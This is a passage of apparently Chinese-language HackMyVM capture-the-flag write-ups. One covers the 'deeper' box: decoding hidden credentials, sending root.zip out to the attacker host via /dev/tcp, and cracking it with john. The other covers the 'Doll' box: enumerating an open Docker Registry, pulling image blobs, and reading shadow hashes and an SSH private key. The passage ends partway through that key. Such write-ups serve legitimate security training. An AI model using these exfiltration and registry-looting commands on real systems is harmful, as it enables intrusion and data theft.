2.\u8e29\u70b9\n\n![Image](https://github.com/user-attachments/assets/91ecf9bd-ad4e-46cc-a738-92bfc7524a8b)\n\n\u52a0\u4e0a\n\n![Image](https://github.com/user-attachments/assets/a2ee96a4-dce7-48ce-b94c-68125e7b3459)\n\n![Image](https://github.com/user-attachments/assets/f7e4d481-8c35-47be-ba4d-88c63577b3c6)\n\n![Image](https://github.com/user-attachments/assets/6ca74cb9-75f8-49fe-8abb-fb13d0bd5c02)\n\n\u89e3\u7801\uff08[cyberchef](https://cyberchef.org/)\uff09\n\n![Image](https://github.com/user-attachments/assets/5a25d1be-e84d-4793-948c-0a3678f8ceaa)\n\n![Image](https://github.com/user-attachments/assets/c68825cd-5fbd-459d-aed3-0a45900572b1)\n\n# 3.\u63d0\u6743\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ssh alice@192.168.205.143                                             \nThe authenticity of host '192.168.205.143 (192.168.205.143)' can't be established.\nED25519 key fingerprint is SHA256:LsWOF4O2aDb/w6V7Z5VEAcjNfkxMmPOzyEIC7HMr91o.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.143' (ED25519) to the list of known hosts.\nalice@192.168.205.143's password: \nLinux deeper 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sat Aug 26 00:38:16 2023 from 192.168.100.103\nalice@deeper:~$ id\nuid=1000(alice) gid=1000(alice) groups=1000(alice)\nalice@deeper:~$ sudo -l\n[sudo] password for alice: \nSorry, user alice may not run sudo on deeper.\nalice@deeper:~$ ls -la\ntotal 32\ndrwxr--r-- 3 alice alice 4096 Aug 26  2023 .\ndrwxr-xr-x 4 root  root  4096 Aug 25  2023 ..\nlrwxrwxrwx 1 alice alice    9 Aug 25  2023 .bash_history -> /dev/null\n-rw-r--r-- 1 alice alice  220 Aug 25  2023 .bash_logout\n-rw-r--r-- 1 alice alice 3526 Aug 25  2023 .bashrc\n-rw-r--r-- 1 alice alice   41 Aug 25  2023 .bob.txt\ndrwxr-xr-x 3 alice alice 4096 Aug 26  2023 .local\n-rw-r--r-- 1 alice alice  807 Aug 25  2023 .profile\n-rw-r--r-- 1 alice alice   33 Aug 26  2023 user.txt\nalice@deeper:~$ cat .bob.txt\n535746745247566c634556756233566e61413d3d\n\n```\n\n![Image](https://github.com/user-attachments/assets/6cba623b-f063-4b85-93e5-72e751571700)\n\n```bash\nalice@deeper:/home$ su - bob\nPassword: \nbob@deeper:~$ id\nuid=1001(bob) gid=1001(bob) groups=1001(bob)\nbob@deeper:~$ sudo -l\n[sudo] password for bob: \nSorry, user bob may not run sudo on deeper.\nbob@deeper:~$ ls -la\ntotal 28\ndrwxr--r-- 3 bob  bob  4096 Aug 26  2023 .\ndrwxr-xr-x 4 root root 4096 Aug 25  2023 ..\nlrwxrwxrwx 1 bob  bob     9 Aug 25  2023 .bash_history -> /dev/null\n-rw-r--r-- 1 bob  bob   220 Apr 23  2023 .bash_logout\n-rw-r--r-- 1 bob  bob  3526 Apr 23  2023 .bashrc\ndrwxr-xr-x 3 bob  bob  4096 Aug 25  2023 .local\n-rw-r--r-- 1 bob  bob   807 Aug 25  2023 .profile\n-rw-r--r-- 1 bob  bob   215 Aug 26  2023 root.zip\nbob@deeper:~$ cat root.zip > /dev/tcp/192.168.205.141/7777\n\n#kali\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ nc -lvnp 7777 > root.zip \nlistening on [any] 7777 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.143] 40706\n                                                 \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ zip2john root.zip > hash                          \nver 1.0 efh 5455 efh 7875 root.zip/root.txt PKZIP Encr: 2b chk, TS_chk, cmplen=33, decmplen=21, crc=2D649941 ts=BA81 cs=ba81 type=0\n                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash \nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nNo password hashes left to crack (see FAQ)\n                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ john --show hash                                  \nroot.zip/root.txt:bob:root.txt:root.zip::root.zip\n\n1 password hash cracked, 0 left                                              \n                                 \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ unzip root.zip\nArchive:  root.zip\n[root.zip] root.txt password: \n extracting: root.txt                                                                                                                                               \n                                                                                                                                 \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ cat root.txt\nroot:IhateMyPassword\n                                \n```\n\n\u767b\u5f55root\n\n```bash\nbob@deeper:~$ su -\nPassword: \nroot@deeper:~# id\nuid=0(root) gid=0(root) groups=0(root)\n\n```sentence", "top": 0, "createdAt": 1751016780, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P100": {"htmlDir": "docs/post/hmv_Doll.html", "labels": ["HackMyVM"], "postTitle": "hmv_Doll", "postUrl": "post/hmv_Doll.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/100", "commentNum": 0, "wordCount": 21666, "description": "# hmv_Doll\n\n# 0.\u95f2\u804a\n\n![image](assets/image-20250129201949-6vewhf4.png)\n\n**\u9776\u673a\uff1a** https://hackmyvm.eu/machines/machine.php?vm=Doll\n\n**\u9776\u673a IP\uff1a** 192.168.72.129\n\n**kali IP\uff1a** 192.168.72.128\n\n\u4eca\u5929\u5e74\u521d\u4e8c\uff0c\u6709\u70b9\u7a7a\uff0c\u66f4\u65b0\u4e00\u4e0bwp\n\n# 1.\u626b\u63cf\n\n\u200b`nmap`\u200b\u5f00\u626b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS -Pn -n -p- --min-rate 10000 192.168.72.129\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:16 EST\nNmap scan report for 192.168.72.129\nHost is up (0.00020s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n1007/tcp open  unknown\nMAC Address: 08:00:27:F7:F4:53 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.19 seconds\n                                                                  \n```\n\n\u5176\u4e2d`1007`\u200b\u4e0d\u77e5\u9053\u662f\u4ec0\u4e48\u670d\u52a1\uff0c\u6211\u4eec\u8be6\u7ec6\u626b\u63cf\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sT -sV -Pn -n -p1007 192.168.72.129        \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:17 EST\nNmap scan report for 192.168.72.129\nHost is up (0.00039s latency).\n\nPORT     STATE SERVICE VERSION\n1007/tcp open  http    Docker Registry (API: 2.0)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 21.26 seconds\n\n```\n\n\u4e0d\u77e5\u9053\u662f\u4ec0\u4e48\u4e1c\u897f\uff0c\u6211\u4eec\u7b49\u4f1a\u641c\u7d22\u4e00\u4e0b\n\n# 2.\u8e29\u70b9\n\n\u5728**hacktricks**\u200b\u4e0a\u627e\u5230[5000 - Pentesting Docker Registry](https://book.hacktricks.wiki/zh/network-services-pentesting/5000-pentesting-docker-registry.html)\u8fd9\u7bc7\u6587\u7ae0\n\n![image](assets/image-20250129202845-u4dct3k.png)\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.72.129:1007/v2/_catalog\n{'repositories':['dolly']}\n                              \n```\n\n\u7ee7\u7eed\u5229\u7528\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.72.129:1007/v2/dolly/tags/list\n{'name':'dolly','tags':['latest']}\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.72.129:1007/v2/dolly/manifests/latest\n{\n   'schemaVersion': 1,\n   'name': 'dolly',\n   'tag': 'latest',\n   'architecture': 'amd64',\n   'fsLayers': [\n      {\n         'blobSum': 'sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017'\n      },\n      {\n         'blobSum': 'sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4'\n      },\n      {\n         'blobSum': 'sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4'\n      },\n      {\n         'blobSum': 'sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09'\n      }\n   ],\n   'history': [\n      {\n         'v1Compatibility': '{\\'architecture\\':\\'amd64\\',\\'config\\':{\\'Hostname\\':\\'10ddd4608cdf\\',\\'Domainname\\':\\'\\',\\'User\\':\\'\\',\\'AttachStdin\\':true,\\'AttachStdout\\':true,\\'AttachStderr\\':true,\\'Tty\\':true,\\'OpenStdin\\':true,\\'StdinOnce\\':true,\\'Env\\':[\\'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\\'],\\'Cmd\\':[\\'/bin/sh\\'],\\'Image\\':\\'doll\\',\\'Volumes\\':null,\\'WorkingDir\\':\\'\\',\\'Entrypoint\\':null,\\'OnBuild\\':null,\\'Labels\\':{}},\\'container\\':\\'10ddd4608cdfd81cd95111ecfa37499635f430b614fa326a6526eef17a215f06\\',\\'container_config\\':{\\'Hostname\\':\\'10ddd4608cdf\\',\\'Domainname\\':\\'\\',\\'User\\':\\'\\',\\'AttachStdin\\':true,\\'AttachStdout\\':true,\\'AttachStderr\\':true,\\'Tty\\':true,\\'OpenStdin\\':true,\\'StdinOnce\\':true,\\'Env\\':[\\'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\\'],\\'Cmd\\':[\\'/bin/sh\\'],\\'Image\\':\\'doll\\',\\'Volumes\\':null,\\'WorkingDir\\':\\'\\',\\'Entrypoint\\':null,\\'OnBuild\\':null,\\'Labels\\':{}},\\'created\\':\\'2023-04-25T08:58:11.460540528Z\\',\\'docker_version\\':\\'23.0.4\\',\\'id\\':\\'89cefe32583c18fc5d6e6a5ffc138147094daac30a593800fe5b6615f2d34fd6\\',\\'os\\':\\'linux\\',\\'parent\\':\\'1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\\'}'\n      },\n      {\n         'v1Compatibility': '{\\'id\\':\\'1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\\',\\'parent\\':\\'638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\\',\\'comment\\':\\'buildkit.dockerfile.v0\\',\\'created\\':\\'2023-03-29T18:19:24.45578926Z\\',\\'container_config\\':{\\'Cmd\\':[\\'ARG passwd=devilcollectsit\\']},\\'throwaway\\':true}'\n      },\n      {\n         'v1Compatibility': '{\\'id\\':\\'638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\\',\\'parent\\':\\'cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\\',\\'created\\':\\'2023-03-29T18:19:24.45578926Z\\',\\'container_config\\':{\\'Cmd\\':[\\'/bin/sh -c #(nop)  CMD [\\\\\\'/bin/sh\\\\\\']\\']},\\'throwaway\\':true}'\n      },\n      {\n         'v1Compatibility': '{\\'id\\':\\'cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\\',\\'created\\':\\'2023-03-29T18:19:24.348438709Z\\',\\'container_config\\':{\\'Cmd\\':[\\'/bin/sh -c #(nop) ADD file:9a4f77dfaba7fd2aa78186e4ef0e7486ad55101cefc1fabbc1b385601bb38920 in / \\']}}'\n      }\n   ],\n   'signatures': [\n      {\n         'header': {\n            'jwk': {\n               'crv': 'P-256',\n               'kid': 'X7W5:IVTA:CKTP:A6JJ:IMVJ:FOTQ:OO4M:CB4C:6JYB:PX6R:DQ6C:JPGS',\n               'kty': 'EC',\n               'x': 'm6jL0NHxYkVUo0-ID-HLzT0Y3OqOeOBvekpF98kC-4c',\n               'y': 'WlToBayTJ8f4zcry3wiq1fMvedgRkuwE7Oycza83_YA'\n            },\n            'alg': 'ES256'\n         },\n         'signature': 'n75fkjkUhAvtqrT2JfMVuBUtIUgiZ0ZhgYmM4m9kqOHprKnq7YrMyNKYYTntkxDmN2uW2w_3o36LvmRW7KzyOg',\n         'protected': 'eyJmb3JtYXRMZW5ndGgiOjI4MjksImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyNS0wMS0zMFQwMToyOTo0NVoifQ'\n      }\n   ]\n}                                                                                                                                     \n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ mkdir tmp     \n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cd tmp \n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ curl http://192.168.72.129:1007/v2/dolly/blobs/sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017 -o blob1.tar\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  3707  100  3707    0     0   971k      0 --:--:-- --:--:-- --:--:-- 1206k\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ tar -xf blob1.tar\n                         \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ ls -la\n\u603b\u8ba1 24\ndrwxrwxr-x 5 kali kali 4096  1\u670829\u65e5 20:32 .\ndrwxrwxr-x 4 kali kali 4096  1\u670829\u65e5 20:32 ..\n-rw-rw-r-- 1 kali kali 3707  1\u670829\u65e5 20:32 blob1.tar\ndrwxr-xr-x 2 kali kali 4096 2023\u5e74 4\u670825\u65e5 etc\ndrwxr-xr-x 3 kali kali 4096 2023\u5e74 4\u670825\u65e5 home\ndrwx------ 2 kali kali 4096 2023\u5e74 4\u670825\u65e5 root\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ cd etc \n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp/etc]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 32\ndrwxr-xr-x 2 kali kali 4096 2023\u5e74 4\u670825\u65e5 .\ndrwxrwxr-x 5 kali kali 4096  1\u670829\u65e5 20:32 ..\n-rw-r--r-- 1 kali kali  710 2023\u5e74 4\u670825\u65e5 group\n-rw-r--r-- 1 kali kali  697 2022\u5e7411\u6708 4\u65e5 group-\n-rw-r--r-- 1 kali kali 1223 2023\u5e74 4\u670825\u65e5 passwd\n-rw-r--r-- 1 kali kali 1223 2023\u5e74 4\u670825\u65e5 passwd-\n-rw-r----- 1 kali kali  553 2023\u5e74 4\u670825\u65e5 shadow\n-rw-r----- 1 kali kali  448 2023\u5e74 4\u670825\u65e5 shadow-\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp/etc]\n\u2514\u2500$ cat *   \nroot:x:0:root\nbin:x:1:root,bin,daemon\ndaemon:x:2:root,bin,daemon\nsys:x:3:root,bin,adm\nadm:x:4:root,adm,daemon\ntty:x:5:\ndisk:x:6:root,adm\nlp:x:7:lp\nmem:x:8:\nkmem:x:9:\nwheel:x:10:root\nfloppy:x:11:root\nmail:x:12:mail\nnews:x:13:news\nuucp:x:14:uucp\nman:x:15:man\ncron:x:16:cron\nconsole:x:17:\naudio:x:18:\ncdrom:x:19:\ndialout:x:20:root\nftp:x:21:\nsshd:x:22:\ninput:x:23:\nat:x:25:at\ntape:x:26:root\nvideo:x:27:root\nnetdev:x:28:\nreadproc:x:30:\nsquid:x:31:squid\nxfs:x:33:xfs\nkvm:x:34:kvm\ngames:x:35:\nshadow:x:42:\ncdrw:x:80:\nwww-data:x:82:\nusb:x:85:\nvpopmail:x:89:\nusers:x:100:games\nntp:x:123:\nnofiles:x:200:\nsmmsp:x:209:smmsp\nlocate:x:245:\nabuild:x:300:\nutmp:x:406:\nping:x:999:\nnogroup:x:65533:\nnobody:x:65534:\nbela:x:1000:\nroot:x:0:root\nbin:x:1:root,bin,daemon\ndaemon:x:2:root,bin,daemon\nsys:x:3:root,bin,adm\nadm:x:4:root,adm,daemon\ntty:x:5:\ndisk:x:6:root,adm\nlp:x:7:lp\nmem:x:8:\nkmem:x:9:\nwheel:x:10:root\nfloppy:x:11:root\nmail:x:12:mail\nnews:x:13:news\nuucp:x:14:uucp\nman:x:15:man\ncron:x:16:cron\nconsole:x:17:\naudio:x:18:\ncdrom:x:19:\ndialout:x:20:root\nftp:x:21:\nsshd:x:22:\ninput:x:23:\nat:x:25:at\ntape:x:26:root\nvideo:x:27:root\nnetdev:x:28:\nreadproc:x:30:\nsquid:x:31:squid\nxfs:x:33:xfs\nkvm:x:34:kvm\ngames:x:35:\nshadow:x:42:\ncdrw:x:80:\nwww-data:x:82:\nusb:x:85:\nvpopmail:x:89:\nusers:x:100:games\nntp:x:123:\nnofiles:x:200:\nsmmsp:x:209:smmsp\nlocate:x:245:\nabuild:x:300:\nutmp:x:406:\nping:x:999:\nnogroup:x:65533:\nnobody:x:65534:\nroot:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nbela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash\nroot:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nbela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash\nroot:*::0:::::\nbin:!::0:::::\ndaemon:!::0:::::\nadm:!::0:::::\nlp:!::0:::::\nsync:!::0:::::\nshutdown:!::0:::::\nhalt:!::0:::::\nmail:!::0:::::\nnews:!::0:::::\nuucp:!::0:::::\noperator:!::0:::::\nman:!::0:::::\npostmaster:!::0:::::\ncron:!::0:::::\nftp:!::0:::::\nsshd:!::0:::::\nat:!::0:::::\nsquid:!::0:::::\nxfs:!::0:::::\ngames:!::0:::::\ncyrus:!::0:::::\nvpopmail:!::0:::::\nntp:!::0:::::\nsmmsp:!::0:::::\nguest:!::0:::::\nnobody:!::0:::::\nbela:$6$azVVFjn.mkvh.lhA$yAXPBGOZDXRdDBmn3obtzhUzxwfDD7u3YIcixohpKzTGpJS0Oeu7UVoguhmwg4DHNM8K5z7Tn93BBaDadM/A5.:19472:0:99999:7:::\nroot:*::0:::::\nbin:!::0:::::\ndaemon:!::0:::::\nadm:!::0:::::\nlp:!::0:::::\nsync:!::0:::::\nshutdown:!::0:::::\nhalt:!::0:::::\nmail:!::0:::::\nnews:!::0:::::\nuucp:!::0:::::\noperator:!::0:::::\nman:!::0:::::\npostmaster:!::0:::::\ncron:!::0:::::\nftp:!::0:::::\nsshd:!::0:::::\nat:!::0:::::\nsquid:!::0:::::\nxfs:!::0:::::\ngames:!::0:::::\ncyrus:!::0:::::\nvpopmail:!::0:::::\nntp:!::0:::::\nsmmsp:!::0:::::\nguest:!::0:::::\nnobody:!::0:::::\nbela:!:19472:0:99999:7:::\n                                 \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp/etc]\n\u2514\u2500$ cd ..                                \n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ ls la \nls: \u65e0\u6cd5\u8bbf\u95ee 'la': \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ ls -la\n\u603b\u8ba1 24\ndrwxrwxr-x 5 kali kali 4096  1\u670829\u65e5 20:32 .\ndrwxrwxr-x 4 kali kali 4096  1\u670829\u65e5 20:32 ..\n-rw-rw-r-- 1 kali kali 3707  1\u670829\u65e5 20:32 blob1.tar\ndrwxr-xr-x 2 kali kali 4096 2023\u5e74 4\u670825\u65e5 etc\ndrwxr-xr-x 3 kali kali 4096 2023\u5e74 4\u670825\u65e5 home\ndrwx------ 2 kali kali 4096 2023\u5e74 4\u670825\u65e5 root\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ cd home \n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp/home]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 12\ndrwxr-xr-x 3 kali kali 4096 2023\u5e74 4\u670825\u65e5 .\ndrwxrwxr-x 5 kali kali 4096  1\u670829\u65e5 20:32 ..\ndrwxr-xr-x 3 kali kali 4096 2023\u5e74 4\u670825\u65e5 bela\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp/home]\n\u2514\u2500$ cd bela \n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp/home/bela]\n\u2514\u2500$ l -al \n\u603b\u8ba1 16\ndrwxr-xr-x 3 kali kali 4096 2023\u5e74 4\u670825\u65e5 ./\ndrwxr-xr-x 3 kali kali 4096 2023\u5e74 4\u670825\u65e5 ../\n-rw------- 1 kali kali   57 2023\u5e74 4\u670825\u65e5 .ash_history\ndrwxr-xr-x 2 kali kali 4096 2023\u5e74 4\u670825\u65e5 .ssh/\n-rwxr-xr-x 1 kali kali    0 1969\u5e7412\u670831\u65e5 .wh..wh..opq*\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp/home/bela]\n\u2514\u2500$ cat .ash_history                     \npwd\nls -la\nmkdir .ssh\ncd .ssh\nnano id_rsa\nvi id_rsa\nexit\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp/home/bela]\n\u2514\u2500$ cat .wh..wh..opq\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp/home/bela]\n\u2514\u2500$ cd .ssh       \n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/tmp/home/bela/.ssh]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 12\ndrwxr-xr-x 2 kali kali 4096 2023\u5e74 4\u670825\u65e5 .\ndrwxr-xr-x 3 kali kali 4096 2023\u5e74 4\u670825\u65e5 ..\n-rw-r--r-- 1 kali kali 2635 2023\u5e74 4\u670825\u65e5 id_rsa\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/tmp/home/bela/.ssh]\n\u2514\u2500$ cat id_rsa    \n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDcKqC+Vu\n8+IuIYoOg+DY+jAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQCyBSUdK8GS\n/z9a8hHWsXOIVwTWB0Q+/6AA/Iuke7N0qIZzBQ5cUrNpYwYn7Nstn0zgYY7Bbr+LIB7Lwe\nrL+Qa1F+bsD1ICGNESUl3lxfy60qSZFVkm0KEwdFIXNX6wRTgjpjkfOxZOhHeA5dB51mgS\n/4QPYS9RQjS7SCEuLXkf9cAJpBL/S7XLuR/EGwk/Ev4rE4jyNHTB25ZcHdsPaTWFl+0UTW\n9bzfGi4r6vEja/PyknTCyARDgXB2rGfksqkkzqBiUNsSuplMaPZIaOrbjOZaoWzkDEFjUA\nqOqKzM+0cxE1dyNs1BYl5lnPieFa2Z8t4g+3wAT+fQuQDVAHFygzDgeDvNq6wxbG2yEI8N\njn7yHOQ6JyxyWx3Q5EZMA8wbH/Qv3PX4u6XR6b0yBLxnEzj0mpAj6TtMz+JeUtjTY7w8pi\nztl+elblqaFQk1BqZfdwm9NDc5rsmn6CTP6l0xVA+RLK0mPAEH71psLAF+LeNTRwL4Z1Zg\nz9dMplY0FqvZsAAAWAFycThGBPxMCQeVqUEEZtNtg8Bcnn4wUBRN1fBofq6nEBJRLomZhx\n+hsdAk6n9bZcoBzNOouJYXmHxlEafkcVDtgKiSRW+eyDF919zRB8PmplqL//XfmkFssNS3\nIgWifBpv5K8NzPnT8lTl2QkQfLQmdFpKkN9zdZXiJAJ8O29pStksK/3WQJs/oXQVh9zCE0\nV1lP+NWkunvOBQlMLNUhmrduR20b1s7ApU8/sMshsHIRNebov2mGxBLvcEl6VLHkv8GCrD\nB6HRqlLvgJDwi9YvNq6yEsvJrVePfJL5rohQgvB7VKFUrXvTc+w74OOd1QLBJlu/9IAuza\n7lyIr2qyjV03r2mJI8CuDDGuDMovFgSqzhsJpBSS4Q6WIThaaedbu0qQgQ0ByJi7ESqot6\nkHoW7txglqkzPSHmH8vZQBiWrPsTJH7BifInfuFOsjNNJJurf+4jC0qFAa+vM/WTHsiT5F\nwIYx2NfxPp9ybLzseFddmXrGqzyHANxqmRVQ2PP49VXsXt+vSPIXHeqpV7Fg9SWaSe57RQ\njkkwPjrNjA2VZAjla7g5mR9O1Zf+UdhpWFStWC70GBUBZXFlRAYsOHgZ9z1gKv7TM6xZkJ\nsw7yVebiNwZWkeNjGR4BSXUxLmFJ44Tge2qAoIYE8BkreSWHhczHlqD1HlzcDgZiyV8uao\n9t6LM3ethaVehuNLqg1pPPAwLKbGlENEbFyKgM/kAFQT+pxUDLQB5vVinP0S0vU8qNoFqk\nPUZErRa6h4KcvF6zDJv5/PpSVj2EcwN/QOrW/Bg1FgoUfNq0YkRrGAqHpGqIA6zUJY/kbv\nyMTbewrSyQjL1G5IQhvIEAm6t7vzY1bS/2xUhJcIrUNSY8D1SSu/t56h3PgCeqpE4rzniy\nh5iWEcdBjSF7CSb5IyULOPrsRbpZcGQbhGa9XGxep6Y4Knb9DTJxl/O7o